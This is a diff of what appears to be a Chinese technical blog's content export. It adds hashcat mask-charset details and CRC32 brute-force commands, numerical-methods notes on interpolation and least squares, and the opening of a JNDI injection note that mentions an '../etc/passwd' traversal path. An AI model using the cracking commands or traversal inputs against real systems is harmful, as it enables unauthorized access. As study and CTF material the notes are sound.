@@ -9759,6 +9759,10 @@ r\geq4
 <td>--increment-max</td>
 <td>设置密码最大长度</td>
 </tr>
+<tr class="odd">
+<td>--hash-info</td>
+<td>展示对应哈希模式的示例</td>
+</tr>
 </tbody>
 </table>
 <h2 id="a-破解模式">-a 破解模式</h2>
@@ -9794,6 +9798,10 @@ r\geq4
 </table>
 <h2 id="掩码字符集">掩码字符集</h2>
 <table>
+<colgroup>
+<col style="width: 14%">
+<col style="width: 85%">
+</colgroup>
 <thead>
 <tr class="header">
 <th>掩码字符集</th>
@@ -9803,35 +9811,36 @@ r\geq4
 <tbody>
 <tr class="odd">
 <td>?l</td>
-<td>代表小写字母</td>
+<td>代表小写字母 <code>abcdefghijklmnopqrstuvwxyz [a-z]</code></td>
 </tr>
 <tr class="even">
 <td>?u</td>
-<td>代表大写字母</td>
+<td>代表大写字母 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]</code></td>
 </tr>
 <tr class="odd">
 <td>?d</td>
-<td>代表数字</td>
+<td>代表数字 <code>0123456789 [0-9]</code></td>
 </tr>
 <tr class="even">
 <td>?h</td>
-<td>常见小写字母和数字</td>
+<td>小写十六进制字符 <code>0123456789abcdef [0-9a-f]</code></td>
 </tr>
 <tr class="odd">
 <td>?H</td>
-<td>常见大写字母和数字</td>
+<td>大写十六进制字符 <code>0123456789ABCDEF [0-9A-F]</code></td>
 </tr>
 <tr class="even">
 <td>?s</td>
-<td>代表特殊字符</td>
+<td>代表特殊字符，包括空格
+<code>!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;</code></td>
 </tr>
 <tr class="odd">
 <td>?a</td>
-<td>代表大小写字母、数字以及特殊字符</td>
+<td>代表大小写字母、数字以及特殊字符 <code>?l?u?d?s</code></td>
 </tr>
 <tr class="even">
 <td>?b</td>
-<td>0x00-0xff</td>
+<td>0x00 - 0xff</td>
 </tr>
 </tbody>
 </table>
@@ -11339,6 +11348,11 @@ Authenticate），其中寻找到相应信息组成哈希，格式为</p>
 <blockquote>
 <p>参考链接：<a href="https://www.jianshu.com/p/45b85006641a">https://www.jianshu.com/p/45b85006641a</a></p>
 </blockquote>
+<h2 id="crc32-爆破">CRC32 爆破</h2>
+<p>例如 CRC 值是 <code>eb32038d</code>，原值是四个可见字符，那么</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 11500 -a 3 eb32038d:00000000 <span class="string">&#x27;?a?a?a?a-&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>也可以自定义字符集，例如</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 11500 -a 3 -1 <span class="string">&#x27;0123456789&#x27;</span> 0972d361:00000000 <span class="string">&#x27;?1?1?1?1?1?1&#x27;</span></span><br></pre></td></tr></table></figure>
 <h2 id="wifi-密码破解">WIFI 密码破解</h2>
 <p>首先先把握手包转化为 hccapx 格式</p>
 <blockquote>
@@ -18584,15 +18598,365 @@ f_n+\cdots+\frac{t(t-1)\cdots(t-n+1)}{n!}\nabla^n f_n
 </blockquote>
 <h2 id="埃尔米特插值法">埃尔米特插值法</h2>
 <h3 id="埃尔米特插值多项式">埃尔米特插值多项式</h3>
-<p>许多实际的插值问题不但要求节点处函数值相同，还要求它的函数有相同的一阶、二阶导数。</p>
-<p>满足这种要求的插值多项式就是埃尔米特插值多项式，其插值多项式有 <span class="math inline">\(2n+1\)</span> 次数，即 <span class="math display">\[
-H_{2n+1}(x)=a_0+a_1x+\cdots+a_{2n+1}x^{2n+1}
-\]</span> 故需要 <span class="math inline">\(2n+2\)</span>
+<p>许多实际的插值问题不但要求节点处函数值相同，还要求它的函数有相同的一阶、二阶导数，满足这种要求的插值多项式就是埃尔米特插值多项式。</p>
+<p>故需要 <span class="math inline">\(2n+2\)</span>
 个条件（数据点），其满足 <span class="math display">\[
-H_{2n+1}(x_i)=f(x_i),H&#39;_{2n+1}(x_i)=f&#39;(x_i)
+\begin{cases}
+H_{2n+1}(x_i)=f(x_i)\\
+H&#39;_{2n+1}(x_i)=f&#39;(x_i)
+\end{cases}
 \]</span> 余项为 <span class="math display">\[
 R(x)=\frac{f^{2n+2}(\xi)}{(2n+2)!}w_{n+1}^2(x)
+\]</span> 为了满足条件，那么埃尔米特插值多项式的一般公式为 <span class="math display">\[
+H(x)=\sum^n_{i=0}[\alpha_i(x)y_i+\beta_i(x)y_i&#39;]
+\]</span> 其中，<span class="math inline">\(\alpha_i(x)\)</span>
+主管函数值，其导数值要为 0；<span class="math inline">\(\beta_i(x)\)</span> 主管导数值，函数值为 0。</p>
+<p>一个满足条件的函数为 <span class="math display">\[
+\begin{cases}
+\alpha_i(x)=[1-2(x-x_i)l_i&#39;(x_i)][l_i(x)]^2\\
+\beta_i(x)=(x-x_i)[l_i(x)]^2
+\end{cases}
 \]</span></p>
+<h2 id="龙格现象">龙格现象</h2>
+<p>龙格（Runge）现象指的是当对函数进行高次插值时，插值多项式 <span class="math inline">\(\varphi_n(x)\)</span> 对 <span class="math inline">\(f(x)\)</span> 的逼近效果反而会更差。</p>
+<p>比如说 <span class="math inline">\(f(x)=1/(1+x_i^2)\)</span>，对该函数进行 <span class="math inline">\(n\)</span>
+次插值，可以得到不同次数下拉格朗日插值多项式的比较图</p>
+<figure>
+<img src="/numerical-method-note/%E9%BE%99%E6%A0%BC%E7%8E%B0%E8%B1%A1.png" alt="龙格现象">
+<figcaption aria-hidden="true">龙格现象</figcaption>
+</figure>
+<p>并不是插值多项式的次数越高，插值效果越好，精度也不一定是随次数的提高而升高。</p>
+<p>故<strong>不适宜在大范围使用高次代数插值</strong>。</p>
+<h2 id="分段线性插值">分段线性插值</h2>
+<p>基于龙格现象的理论，既然大范围使用代数插值效果不好，那么就说明小范围使用代数插值效果是良好的，那对于多个紧凑的数据点，不妨通过分段插值的方式，使得各个插值点用折线段连接起来，便得到了一个分段插值函数。</p>
+<p>在一定区间内，可证明的是，计算量与 <span class="math inline">\(n\)</span> 无关，<span class="math inline">\(n\)</span> 越大误差越小。</p>
+<h2 id="分段三次埃尔米特插值">分段三次埃尔米特插值</h2>
+<h2 id="三次样条插值">三次样条插值</h2>
+<h1 id="函数逼近与曲线拟合">函数逼近与曲线拟合</h1>
+<h2 id="为什么需要曲线拟合">为什么需要曲线拟合</h2>
+<p>插值法的核心要求是，插值函数要经过数据点中的所有点，但实际上的实验数据并不都是完美接近理论的，总会存在一定的噪声使得数据点偏离，这时插值法实际上并不能很好地拟合原函数。</p>
+<figure>
+<img src="/numerical-method-note/matlab%E5%AF%B9%E4%BA%8E%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8B%9F%E5%90%88.png" alt="matlab对于实验数据的拟合">
+<figcaption aria-hidden="true">matlab对于实验数据的拟合</figcaption>
+</figure>
+<p>此时我们可以回归原本，我们为什么想要拟合函数经过数据点中的所有点呢？</p>
+<p>因为希望说拟合函数逼近原函数。</p>
+<p>这也是函数逼近问题：在实际应用中常需为解析式比较复杂的函数<strong>寻找一个简单函数来近似代替它</strong>，并<strong>要求其误差在某种度量意义下最小</strong>。</p>
+<p>曲线拟合问题：在实际应用中，往往并不需要曲线通过给定的数据点，而只要求<strong>用曲线（函数）近似代替给定的列表函数</strong>时，其<strong>误差在某种度量意义下最小</strong>。</p>
+<p><strong>最佳逼近问题：要求在被插函数的定义区间上都有较好的近似。</strong></p>
+<h2 id="函数逼近">函数逼近</h2>
+<figure>
+<img src="/numerical-method-note/%E6%AE%8B%E5%B7%AE%E5%AE%9A%E4%B9%89.png" alt="残差定义">
+<figcaption aria-hidden="true">残差定义</figcaption>
+</figure>
+<p>我们定义，近似函数求得的近似值 <span class="math inline">\(y_i^*\)</span> 与观测值 <span class="math inline">\(y_i\)</span> 的差 <span class="math inline">\(\delta=y_i-y_i^*\)</span>
+称为<strong>残差</strong>。</p>
+<p>那么为了度量近似函数的好坏，常用的准则为</p>
+<ul>
+<li>使残差的最大绝对值 <span class="math inline">\(\max_i|\delta_i|\)</span> 最小</li>
+<li>使残差的绝对值之和 <span class="math inline">\(\sum|\delta_i|\)</span> 最小</li>
+<li>使残差的平方和 <span class="math inline">\(\sum\delta_i^2\)</span>
+最小</li>
+</ul>
+<blockquote>
+<p>准则 1、2 有绝对值，计算时不方便。</p>
+</blockquote>
+<p>准则 1 求近似函数的方法称为函数的最佳一致逼近。</p>
+<p>准则 3
+确定参数求近似函数的方法称为函数的最佳平方逼近（对连续函数），也称曲线拟合的最小二乘法（对离散数据）。</p>
+<h2 id="内积与内积空间">内积与内积空间</h2>
+<p>在曾经学过，两个向量的内积定义和范数定义是 <span class="math display">\[
+\begin{cases}
+(\mathbf{x},\mathbf{y})=\sum x_iy_i\\
+\|\mathbf{x}\|_2=\sqrt{(\mathbf{x},\mathbf{x})}=\sqrt{\sum x_i^2}
+\end{cases}
+\]</span>
+在某些问题中，向量中每个分量的重要性是不相同的，比如说在机器学习中，可能前几个分量的重要性高，而后几个分量的重要性低，此时我们就会引入权重
+<span class="math inline">\(w_i\)</span>
+来表征<strong>各个分量的重要性</strong>，即 <span class="math display">\[
+\begin{cases}
+(\mathbf{x},\mathbf{y})=\sum w_ix_iy_i\\
+\|\mathbf{x}\|_2=\sqrt{(\mathbf{x},\mathbf{x})}=\sqrt{\sum w_ix_i^2}
+\end{cases}
+\]</span>
+向量是离散的，如果说扩展内积的定义，延伸到连续函数上，那么求和就变成了积分，假定两个连续函数
+<span class="math inline">\(f,g\in
+C[a,b]\)</span>，那么<strong>函数内积</strong>的定义为 <span class="math display">\[
+\begin{cases}
+(f,g)=\int^b_af(x)g(x)\mathrm{d}x\\
+\|f\|_2=\sqrt{(f,f)}=\sqrt{\int^b_af^2(x)\mathrm{d}x}
+\end{cases}
+\]</span> 带权重的函数内积同理。</p>
+<blockquote>
+<p>在机器学习中，权函数 <span class="math inline">\(w(x)=1\)</span>
+意味着<strong>区间中所有点具有同等重要性</strong>；</p>
+<p>权函数 <span class="math inline">\(w(x)=\frac{1}{\sqrt{1-x^2}}\)</span>
+意味着<strong>靠近区间端点处的点更加重要而区间中点处的点最不重要</strong>。</p>
+</blockquote>
+<h2 id="正交多项式">正交多项式</h2>
+<p>离散型正交多项式可作为基函数用于<strong>曲线拟合</strong>，提高算法的稳定性；</p>
+<p>连续型正交多项式可作为基函数用于<strong>高斯型求积公式</strong>的构造。</p>
+<p>正交的定义是内积为 0，对于函数内积也是一样的，即如果满足以下式子
+<span class="math display">\[
+(f,g)=\int^b_af(x)g(x)\mathrm{d}x=0
+\]</span> 那么我们称 <span class="math inline">\(f(x)\)</span> 与 <span class="math inline">\(g(x)\)</span> 在 <span class="math inline">\([a,b]\)</span> 上<strong>正交</strong>。</p>
+<p>如果说函数族 <span class="math inline">\(\varphi_0(x),\varphi_1(x),\cdots,\varphi_n(x)\)</span>
+满足关系 <span class="math display">\[
+\begin{align}
+(\varphi_i,\varphi_j)=\int_a^b\varphi_i(x)\varphi_j(x)\mathrm{d}x=\begin{cases}
+0,&amp;i\neq j\\
+A_j,&amp;i=j
+\end{cases}
+\end{align}
+\]</span> 那么称 <span class="math inline">\(\{\varphi_i(x)\}\)</span>
+是 <span class="math inline">\([a,b]\)</span>
+上的<strong>正交函数系</strong>。</p>
+<p>特别地，如果 <span class="math inline">\(A_j=1\)</span>，那么称之为<strong>标准正交函数系</strong>。</p>
+<blockquote>
+<p>带权也是同理。</p>
+</blockquote>
+<h2 id="正交三角函数系">正交三角函数系</h2>
+<p>三角函数系为 <span class="math display">\[
+\{1,\cos x,\sin x,\cos 2x,\sin 2x,\cdots\},x\in[-\pi,\pi]
+\]</span> 可以计算得到任意两个<strong>不同函数</strong>在 <span class="math inline">\([-\pi,\pi]\)</span> 上的内积（积分）为 0 <span class="math display">\[
+\begin{align}
+\int^\pi_{-\pi}\cos {(nx)} \mathrm{d}x=0\\
+\int^\pi_{-\pi}\sin {(nx)} \mathrm{d}x=0\\
+\int^\pi_{-\pi}\sin {(mx)}\cos {(nx)} \mathrm{d}x=0\\
+\int^\pi_{-\pi}\cos {(mx)}\sin {(nx)} \mathrm{d}x=0\\
+\end{align}
+\]</span> 而任意两个相同函数在 <span class="math inline">\([-\pi,\pi]\)</span> 上的内积（积分）为正数 <span class="math display">\[
+\begin{align}
+(1,1)=2\pi\\
+(\sin{(kx)},\sin{(kx)})=\pi\\
+(\cos{(kx)},\cos{(kx)})=\pi
+\end{align}
+\]</span></p>
+<h2 id="施密特正交化">施密特正交化</h2>
+<p>在线性代数中学习可知，对于一组线性无关向量组 <span class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_m\)</span>，那么可以通过以下方式计算得到
+<span class="math display">\[
+\begin{cases}
+\beta_1=\alpha_1\\
+\beta_2=\alpha_2-\frac{(\alpha_2,\beta_1)}{(\beta_1,\beta_1)}\beta_1\\
+\vdots\\
+\beta_m=\alpha_m-\frac{(\alpha_m,\beta_1)}{(\beta_1,\beta_1)}\beta_1-\frac{(\alpha_m,\beta_2)}{(\beta_2,\beta_2)}\beta_2-\cdots-\frac{(\alpha_m,\beta_{m-1})}{(\beta_{m-1},\beta_{m-1})}\beta_{m-1}
+\end{cases}
+\]</span> 其中，<span class="math inline">\(\beta_1,\beta_2,\cdots,\beta_m\)</span>
+就是一组<strong>正交向量组</strong>。</p>
+<p>如果再令 <span class="math display">\[
+e_i=\frac{\beta_i}{\|\beta_i\|}
+\]</span> 那么 <span class="math inline">\(e_1,e_2,\cdots,e_m\)</span>
+就是一组<strong>标准正交向量组</strong>。</p>
+<p>那么同样的，如果说我们对一族线性无关的幂函数 <span class="math display">\[
+\{1,x,\cdots,x^m\}
+\]</span>
+通过施密特正交化的方式也可以得到一族<strong>正交函数系</strong>。</p>
+<p>可以成立如下递推关系式 <span class="math display">\[
+\varphi_{n+1}(x)=(x-\alpha_n)\varphi_n(x)-\beta_n\varphi_{n-1}(x)
+\]</span> 其中， <span class="math display">\[
+\begin{cases}
+\varphi_0(x)=1,\varphi_{-1}(x)=0\\
+\alpha_n=\displaystyle\frac{(x\varphi_n(x),\varphi_n(x))}{(\varphi_n(x),\varphi_n(x))}\\
+\beta_n=\displaystyle\frac{(\varphi_n(x),\varphi_n(x))}{(\varphi_{n-1}(x),\varphi_{n-1}(x))}
+\end{cases}
+\]</span> 在区间 <span class="math inline">\([0,1]\)</span> 上的结果如下
+<span class="math display">\[
+\begin{cases}
+\varphi_0(x)=1\\
+\varphi_1(x)=x-\frac{1}{2}\\
+\varphi_2(x)=x^2-x+\frac{1}{6}\\
+\varphi_3(x)=x^3-\frac{3}{2}x^2+\frac{3}{5}x-\frac{1}{20}\\
+\varphi_4(x)=x^4-2x^3+\frac{9}{7}x^2-\frac{2}{7}x+\frac{1}{70}\\
+\varphi_5(x)=x^5-\frac{5}{2}x^4+\frac{20}{9}x^3-\frac{5}{6}x^2+\frac{5}{42}x-\frac{1}{252}\\
+\varphi_6(x)=x^6-3x^5+\frac{75}{22}x^4-\frac{20}{11}x^3+\frac{5}{11}x^2-\frac{1}{22}x+\frac{1}{924}\\
+\end{cases}
+\]</span> 在区间 <span class="math inline">\([-1,1]\)</span>
+的结果会更简单些（因为奇函数积分为 0），即 <span class="math display">\[
+\begin{cases}
+\varphi_0(x)=1\\
+\varphi_1(x)=x\\
+\varphi_2(x)=x^2-\frac{1}{3}\\
+\varphi_3(x)=x^3-\frac{3}{5}x\\
+\varphi_4(x)=x^4-\frac{6}{7}x^2+\frac{3}{35}\\
+\varphi_5(x)=x^5-\frac{10}{9}x^3+\frac{5}{21}x\\
+\varphi_6(x)=x^6-\frac{15}{11}x^4+\frac{5}{11}x^2-\frac{5}{231}\\
+\varphi_7(x)=x^7-\frac{231}{143}x^5+\frac{105}{143}x^3-\frac{25}{429}x
+\end{cases}
+\]</span> 常用的正交多项式有</p>
+<ul>
+<li>勒让德(Legendre)多项式</li>
+<li>切比雪夫(Chebyshev)多项式</li>
+<li>拉盖尔(Laguerre)多项式</li>
+<li>第二类切比雪夫(Chebyshev)多项式</li>
+<li>埃尔米特(Hermite)多项式</li>
+</ul>
+<h2 id="最佳平方逼近">最佳平方逼近</h2>
+<p>在函数逼近问题中，以残差的平方 <span class="math inline">\(\delta_i^2\)</span>
+最小作为准则就是<strong>最佳平方逼近方法</strong>，而对应的拟合函数称为<strong>最佳平方逼近函数</strong>。</p>
+<p>设 <span class="math inline">\(f(x)\)</span> 在区间 <span class="math inline">\([a,b]\)</span> 上连续，<span class="math inline">\(\varphi_i(x)\)</span> 是一组线性无关的连续函数，即
+<span class="math display">\[
+H=\mathrm{span}\{1,x,\cdots,x^n\}
+\]</span> 若 <span class="math inline">\(\varphi(x)=a_0+a_1x+\cdots+a_nx^n\)</span>，使得
+<span class="math display">\[
+F(a_0,a_1,\cdots,a_n)=\int^b_a[f(x)-\varphi(x)]^2\mathrm{d}x
+\]</span> 最小，则称 <span class="math inline">\(\varphi(x)\)</span> 为
+<span class="math inline">\(f(x)\)</span> 在空间 <span class="math inline">\(H\)</span> 中的 <strong><span class="math inline">\(n\)</span> 次最佳平方逼近多项式</strong>。</p>
+<p>根据多元函数取极值的必要条件可得 <span class="math display">\[
+\frac{\partial F}{\partial
+a_i}=-2\int^b_a[f(x)-\varphi(x)]\varphi_i(x)\mathrm{d}x=0
+\]</span> 即 <span class="math display">\[
+\sum^n_{j=0}a_j\int^b_a\varphi_i(x)\varphi_j(x)\mathrm{d} x=\int^b_a
+f(x)\varphi_i(x)\mathrm{d}x,i=0,\cdots,n
+\]</span> 将积分转化为函数内积的表现形式，为 <span class="math display">\[
+\sum^n_{j=0}(\varphi_i(x),\varphi_j(x))a_j=(f(x),\varphi_i(x)),i=0,\cdots,n
+\]</span> 改写为矩阵形式为 <span class="math display">\[
+\begin{bmatrix}
+(\varphi_0,\varphi_0)&amp;(\varphi_0,\varphi_1)&amp;\cdots&amp;(\varphi_0,\varphi_n)\\
+(\varphi_1,\varphi_0)&amp;(\varphi_1,\varphi_1)&amp;\cdots&amp;(\varphi_1,\varphi_n)\\
+\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
+(\varphi_n,\varphi_0)&amp;(\varphi_n,\varphi_1)&amp;\cdots&amp;(\varphi_n,\varphi_n)
+\end{bmatrix}
+\begin{bmatrix}
+a_0\\
+a_1\\
+\vdots\\
+a_n
+\end{bmatrix}=
+\begin{bmatrix}
+(f,\varphi_0)\\
+(f,\varphi_1)\\
+\vdots\\
+(f,\varphi_n)
+\end{bmatrix}
+\]</span> 由于 <span class="math inline">\(\varphi_0,\varphi_1,\cdots,\varphi_n\)</span>
+线性无关，故<strong>方程组仅有唯一解</strong>。</p>
+<h2 id="最佳平方逼近示例">最佳平方逼近示例</h2>
+<p>比如说 <span class="math inline">\(f(x)=\cos{(\pi x)}\)</span> 在
+<span class="math inline">\([0,1]\)</span>
+上的<strong>一次最佳平方逼近多项式</strong>。</p>
+<p>取 <span class="math inline">\(\varphi_0(x)=1,\varphi_1(x)=x\)</span>，即 <span class="math display">\[
+H=\mathrm{span}\{1,x\}
+\]</span> 那么 <span class="math display">\[
+\begin{cases}
+(\varphi_0,\varphi_0)=\displaystyle\int^1_0 1\mathrm{d}x=1\\
+(\varphi_0,\varphi_1)=(\varphi_1,\varphi_0)=\displaystyle\int^1_0
+x\mathrm{d}x=\frac{1}{2}\\
+(\varphi_1,\varphi_1)=\displaystyle\int^1_0 x^2\mathrm{d}x=\frac{1}{3}\\
+(f,\varphi_0)=\displaystyle\int^1_0 \cos{(\pi x)}\mathrm{d}x=0\\
+(f,\varphi_1)=\displaystyle\int^1_0 x\cos{(\pi
+x)}\mathrm{d}x=-\frac{2}{\pi^2}\\
+\end{cases}
+\]</span> 那么列出方程 <span class="math display">\[
+\begin{cases}
+a_0+\frac{1}{2}a_1=0\\
+\frac{1}{2}a_0+\frac{1}{3}a_1=-\displaystyle\frac{2}{\pi^2}
+\end{cases}
+\]</span> 可以解得 <span class="math display">\[
+\begin{cases}
+a_0=1.2159\\
+a_1=-2.4317
+\end{cases}
+\]</span> 那么一次最佳平方逼近多项式为 <span class="math display">\[
+\varphi(x)=1.2159-2.4317x
+\]</span> 也可以根据极值条件有 <span class="math display">\[
+F(a_0,a_1)=\int^1_0[\cos{(\pi x)-a_0-a_1x}]^2\mathrm{d}x
+\]</span> 使得 <span class="math display">\[
+\begin{cases}
+\displaystyle\frac{\partial F}{\partial a_0}=2\int^1_0-[\cos{(\pi
+x)-a_0-a_1x}]\mathrm{d}x=2a_0+a_1=0\\
+\displaystyle\frac{\partial F}{\partial a_1}=2\int^1_0-x[\cos{(\pi
+x)-a_0-a_1x}]\mathrm{d}x=2(\frac{2}{\pi^2}+\frac{1}{2}a_0+\frac{1}{3}a_1)=0\\
+\end{cases}
+\]</span> <img src="/numerical-method-note/%E4%B8%80%E6%AC%A1%E6%9C%80%E4%BD%B3%E5%B9%B3%E6%96%B9%E9%80%BC%E8%BF%91%E6%8B%9F%E5%90%88%E7%A8%8B%E5%BA%A6.jpg" alt="一次最佳平方逼近拟合程度"></p>
+<h2 id="系数矩阵">系数矩阵</h2>
+<p>从上文不难发现，<span class="math inline">\((\varphi_i,\varphi_j)\)</span> 都是常数，即 <span class="math display">\[
+\begin{bmatrix}
+1&amp;1/2&amp;\cdots&amp;1/(n+1)\\
+1/2&amp;1/3&amp;\cdots&amp;1/(n+2)\\
+\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
+1/(n+1)&amp;1/(n+2)&amp;\cdots&amp;1/(2n+1)
+\end{bmatrix}
+\]</span> 而此时如果 <span class="math inline">\(H\)</span>
+取正交函数系，那么可以进一步简化为 <span class="math display">\[
+\begin{bmatrix}
+(\varphi_0,\varphi_0)&amp;0&amp;\cdots&amp;0\\
+0&amp;(\varphi_1,\varphi_1)&amp;\cdots&amp;0\\
+\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
+0&amp;0&amp;\cdots&amp;(\varphi_n,\varphi_n)
+\end{bmatrix}
+\begin{bmatrix}
+a_0\\
+a_1\\
+\vdots\\
+a_n
+\end{bmatrix}=
+\begin{bmatrix}
+(f,\varphi_0)\\
+(f,\varphi_1)\\
+\vdots\\
+(f,\varphi_n)
+\end{bmatrix}
+\]</span> 对于不同的正交多项式，其系数矩阵均为常数。</p>
+<h2 id="最小二乘法">最小二乘法</h2>
+<p>最佳平方逼近是针对于函数逼近问题的，但实际应用中我们更希望的是给予一堆数据点，然后对其作<strong>曲线拟合</strong>，往往我们并不知道原函数。</p>
+<p>由于数据点是离散的，套用最佳平方逼近的准则是行不通的，需要做一点点改进
+<span class="math display">\[
+\sum \delta_i^2=\sum [y_i-P_m(x_i)]^2
+\]</span> 使得残差平方和最小就是最小二乘法的准则，其中 <span class="math inline">\(P_m(x)\)</span> 称为这组数据的<strong>最小二乘
+<span class="math inline">\(m\)</span> 次拟合多项式</strong>。</p>
+<p>与最佳平方逼近同样的道理，令 <span class="math display">\[
+F(a_0,a_1,\cdots,a_n)=\sum_{i=1}^n[y_i-P_m(x_i)]^2
+\]</span> 那么由极值的必要条件，得 <span class="math display">\[
+\frac{\partial F}{\partial a_i}=-2\sum_{i=1}^n
+[y_i-P_m(x_i)]\varphi_j(x_i)\mathrm{d}x=0
+\]</span> 整理可得 <span class="math display">\[
+\sum_{i=1}^n P_m(x_i)=\sum_{i=1}^n y_i
+\]</span> 那么转化为正规方程组 <span class="math display">\[
+\begin{cases}
+\displaystyle a_0n+a_1\sum_{i=1}^n x_i+\cdots+a_m\sum_{i=1}^n
+x_i^m=\sum_{i=1}^n y_i\\
+\displaystyle a_0\sum_{i=1}^n x_i+a_1\sum_{i=1}^n
+x_i^2+\cdots+a_m\sum_{i=1}^n x_i^{m+1}=\sum_{i=1}^n y_ix_i\\
+\vdots\\
+\displaystyle a_0\sum_{i=1}^n x_i^m+a_1\sum_{i=1}^n
+x_i^{m+1}+\cdots+a_m\sum_{i=1}^n x_i^{2m}=\sum_{i=1}^n y_ix_i^m\\
+\end{cases}
+\]</span> 转化为矩阵形式为 <span class="math display">\[
+\mathbf{Q}^T\mathbf{Q}\mathbf{A}=\mathbf{Q}^T\mathbf{Y}
+\]</span> 其中， <span class="math display">\[
+\begin{align}
+\mathbf{Q}&amp;=\begin{bmatrix}
+1&amp;x_1&amp;\cdots&amp;x_1^m\\
+1&amp;x_2&amp;\cdots&amp;x_2^m\\
+\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
+1&amp;x_n&amp;\cdots&amp;x_n^m\\
+\end{bmatrix}\\
+\mathbf{Q}^T\mathbf{Q}&amp;=\begin{bmatrix}
+n&amp;\sum_1^n x_i&amp;\cdots&amp;\sum_1^n x_i^m\\
+\sum_1^n x_i&amp;\sum_1^n x_i^2&amp;\cdots&amp;\sum_1^n x_i^{m+1}\\
+\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
+\sum_1^n x_i^m&amp;\sum_1^n x_i^{m+1}&amp;\cdots&amp;\sum_1^n x_i^{2m}\\
+\end{bmatrix}\\
+\mathbf{A}&amp;=\begin{bmatrix}
+a_0\\
+a_1\\
+\vdots\\
+a_m
+\end{bmatrix},\mathbf{Y}=\begin{bmatrix}
+y_0\\
+y_1\\
+\vdots\\
+y_n
+\end{bmatrix}
+\end{align}
+\]</span> 该方程组的解对应的多项式就是满足已知数据组的最小二乘 <span class="math inline">\(m\)</span>
+次拟合多项式由于多项式拟合中的正规方程组为线性方程组，所以称其为<strong>线性最小二乘问题</strong>。</p>
+<h2 id="非线性最小二乘拟合">非线性最小二乘拟合</h2>
+<p>高中就学过，如何对非线性数据作最小二乘拟合。</p>
+<figure>
+<img src="/numerical-method-note/%E9%9D%9E%E7%BA%BF%E6%80%A7%E6%9C%80%E5%B0%8F%E4%BA%8C%E4%B9%98.jpg" alt="非线性最小二乘">
+<figcaption aria-hidden="true">非线性最小二乘</figcaption>
+</figure>
 ]]></content>
       <tags>
         <tag>math</tag>
@@ -31632,6 +31996,223 @@ Programming），是一种在反序列化中利用对象属性值进行漏洞
 ]]></content>
       <tags>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JNDI注入笔记</title>
+    <url>//jndi-injection-note.html</url>
+    <content><![CDATA[<h1 id="jndi-的二三事">JNDI 的二三事</h1>
+<h2 id="什么是-jndi">什么是 JNDI</h2>
+<p>数据库是一种资源，我们使用 JDBC 对数据库作包装，然后通过适当的 JDBC
+URL 连接到数据库</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306?user=qsdz&amp;password=qsdzyyds&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>文件也是一种资源，比如说</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;file:///home/qsdz/flag.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p>网络资源也是一种资源，比如说</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;http://www.baidu.com&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Java
+就是一门极其注重抽象的语言，那么我们是否可以对这些资源和资源的定位进行一种抽象？</p>
+<p>答案是是的，JNDI 全称 Java Naming and Directory Interface，分为
+Naming Server 和 Directory Server 两大部分。</p>
+<p>套用在文件资源中，Naming Server
+就是负责解析文件路径，获取文件对象的服务；Directory Server
+就是负责获取文件数据、信息的服务。</p>
+<p>套用在网络资源中，Naming Server 就是负责解析域名的系统，例如
+DNS；Directory Server 就是负责访问具体网络资源的服务，例如
+<code>/index.html</code>，<code>/../../../../etc/passwd</code>。</p>
+<p>通俗易懂地说，JNDI 就是 Java
+中负责资源管理的抽象接口，在这套系统中，我们可以给资源取一个名字，然后通过名字来查找资源，获取资源的属性。</p>
+<h2 id="spi">SPI</h2>
+<p>JNDI 原生支持的一部分协议如下表所示</p>
+<table>
+<colgroup>
+<col style="width: 8%">
+<col style="width: 18%">
+<col style="width: 73%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>协议</th>
+<th>schema</th>
+<th>Context</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>DNS</code></td>
+<td><code>dns://</code></td>
+<td><code>com.sun.jndi.url.dns.dnsURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>RMI</code></td>
+<td><code>rmi://</code></td>
+<td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td>
+</tr>
+<tr class="odd">
+<td><code>LDAP</code></td>
+<td><code>ldap://</code></td>
+<td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>LDAP</code></td>
+<td><code>ldaps://</code></td>
+<td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td>
+</tr>
+<tr class="odd">
+<td><code>IIOP</code></td>
+<td><code>iiop://</code></td>
+<td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>IIOP</code></td>
+<td><code>iiopname://</code></td>
+<td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td>
+</tr>
+<tr class="odd">
+<td><code>IIOP</code></td>
+<td><code>corbaname://</code></td>
+<td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td>
+</tr>
+</tbody>
+</table>
+<p>而针对这些不同自定义协议的解析，是通过 SPI，<em>Service Provider
+Interface</em>，服务供应接口进行实现的，通过实现
+SPI，我们就能够自定义各种不同的协议方式通过 URL
+的方式访问不同类型的资源。</p>
+<h2 id="rmi">RMI</h2>
+<p>RMI，<em>Remote Method Invocation</em>，远程方法调用，这是 Java
+分布式编程中一个十分重要的接口，能够使得客户端远程调用服务端的对象资源。</p>
